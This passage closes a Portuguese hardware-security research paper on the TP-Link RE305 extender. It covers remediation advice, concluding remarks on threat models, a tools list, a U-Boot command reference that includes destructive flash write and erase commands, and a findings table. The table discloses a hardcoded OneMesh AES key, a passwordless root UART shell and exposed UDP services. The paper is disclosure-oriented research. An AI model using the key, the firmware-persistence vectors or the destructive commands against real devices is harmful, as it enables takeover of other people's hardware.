5.  Habilitar `rfc1918_filter` por default no build BR (já estava ativo no build EU).
    
6.  Atualizar dropbear pra versão pós-2017 que tenha CVEs corrigidos.
    
7.  Substituir single DES por AES-128 ou ChaCha20-Poly1305 em TDDP e OneMesh key exchange.
    

Custo de BOM dita o resto. Secure boot com chave em fuse é o único controle que sobrevive a adversário físico determinado, mas encarece o produto.

* * *

## 17\. Considerações finais

Extração de firmware via UART é caminho determinístico e barato. Pra adversário motivado, é a etapa zero de qualquer pesquisa adversarial contra a plataforma.

Pra indústria de SOHO routers e extenders, isso significa que assumir confidencialidade de firmware é falha de modelo de ameaça. Todo segredo embarcado tem que ser tratado como público a partir do momento em que o produto sai de fábrica. A postura de segurança deriva dessa premissa, usando por exemplo secrets per-device derivados de identidade única em fuse, e não chaves globais embarcadas em SquashFS, nem dropbear compilado com config que mente.

O RE305 é caso interessante porque o vendor tem o hardware encryption-at-rest do MT7628 ativado, sinal de que pelo menos uma decisão de hardening foi tomada. E ao mesmo tempo deixa shell root sem senha no UART pós-boot. Defesa contra chip-off ativada, defesa contra cabo serial não. O modelo de ameaça assumido pelo design parece ser o do adversário que dessolda chip, não o do adversário que solda fio.

Pro pesquisador, o RE305 é alvo de estudo excelente. Pads rotulados, U-Boot aberto, plataforma extensivamente documentada, tamanho de flash compatível com dump serial sem chip-off, e shell root no fim do boot que dispensa quebrar a encryption-at-rest pra ver o que tá rodando.

Próximos passos do meu lado, alguns já em andamento no momento desse paper estar fechando: validar in-band as opções 5/6/8 escondidas do menu boot; reverter o binário `tddp` pra confirmar a chain de command injection via `system()`; mapear o wire protocol do `path_selection` em 6000/6001; rodar fuzzer UDP dedicado contra TDDP pra validar CVE-2020-12109 no build de Feb 2020; e caracterizar o timing real de brute-force de single DES no MAC OneMesh key exchange. O disclosure formal pra TP-Link PSIRT cobrindo os achados de chave hardcoded + RSA cleartext + outros segue embargo padrão de 90 dias e está em andamento em paralelo a este paper.

* * *

## Apêndice A. Materiais e ferramentas

| Item | Função |
| --- | --- |
| TP-Link RE305 AC1200 (versão BR, firmware Feb 2020) | Alvo |
| Conversor USB-UART (CP2102 recomendado, ou CH340 / FT232 / Flipper Zero) - Aqui utilizo o flipper pois já tenho. | Bridge serial 3.3 V TTL para USB |
| Resistor 220Ω 1/4 W | Inline entre TX do bridge e RX do alvo, evita back-powering |
| Ferro de solda, estanho 60/40, flux | Soldagem dos pads UART |
| Jumpers Dupont F-F (3x) | Conexão bridge para pads soldados |
| Multímetro | Continuidade e detecção de curto antes de energizar |
| `tio` (v2.7+) | Terminal serial com logging |
| `pyserial` + `uboot_dump.py` (custom) | Automação do `md.b` chunked |
| `binwalk`, `squashfs-tools` | Análise pós-dump |
| `xxd`, `hexdump`, `strings` | Inspeção dos binários |

## Apêndice B. Comandos U-Boot úteis

```plaintext
help              # comandos disponíveis na build
help spi          # subcomandos spi: read/erase/write/sr write (NÃO listado por help puro)
printenv          # dump completo do environment
bdinfo            # board info, memstart, memsize, flashstart, flashsize, ethaddr, baudrate
md.b <a> <n>      # display byte mode, padrão pra dump
md.w <a> <n>      # display word (16-bit)
md.l <a> <n>      # display long (32-bit), útil pra headers
mw.b <a> <v>      # memory write byte
cp.b <s> <d> <n>  # copy bytes
spi read <a> <l>  # lê SPI flash direto pra RAM
spi write <o> <h> # escreve hex em offset da flash (DESTRUTIVO)
spi erase <o> <l> # erase setores (DESTRUTIVO)
spi sr write <v>  # escreve status register da flash
tftpboot <a> <f>  # carrega arquivo de TFTP em endereço de RAM
bootm <a>         # boot de imagem uImage em RAM
```

`mw.b` + `tftpboot` é o vetor de boot de firmware customizado em RAM sem persistir em flash. `spi write` + `spi erase` + `tftpboot` é o vetor de persistência completa em flash. Tratar como API de root no bootloader.

## Apêndice C. Resumo dos achados

| ID | Severidade | Descrição |
| --- | --- | --- |
| F01 | High | `spi write/erase/sr write` subcomandos escondidos no `help` |
| F02 | Medium-High | Opções de menu boot 5/6/8 não listadas (TFTP-Linux/UBoot variants) |
| F03 | High c/ físico | `serverip=192.168.0.184` hardcoded + `bootcmd=tftp` default |
| F04 | Low (Hygiene) | `earlyprintk debug` em production kernel cmdline |
| F05 | Info / Hardening | File-system encrypted-at-rest (hipótese HW engine MT7628) |
| F06 | **Critical** | Shell root no UART pós-boot sem senha, `SysAccountLogin` silently ignored |
| F13 | High | dropbear v2011.54 + flags custom TP-Link `-C`/`-L` |
| F14 | High | `path_selection` em 0.0.0.0:6000+6001 TCP com `handle_update_config_event` |
| F15 | **Critical** | TDDP em 0.0.0.0:1040 UDP, hooks destrutivos + string injection candidate |
| F16 | High | tdpServer (OneMesh) em 0.0.0.0:20002 UDP |
| F17 | High (umbrella) | dropbear 2011.54 = CVE-2016-7406/7/8/9, CVE-2017-9078 surface |
| F19 | **Critical** | TDDP set/get config + erase\_radio + setMac via UDP |
| F20 (rev) | High | tdpServer usa AES-256 com chave global hardcoded `TPONEMESH_Kf!xn?gj6pMAt-wBNV_TDP` no OneMesh slave-key exchange |
| F21 | High | uhttpd HTTP-only (TLS not compiled in binary) |
| F22 | Medium | `rfc1918_filter '0'` no build BR, DNS rebinding habilitado |
| F23 | Hygiene | SSH host keys em ramfs (regen a cada boot) |

{% endraw %}
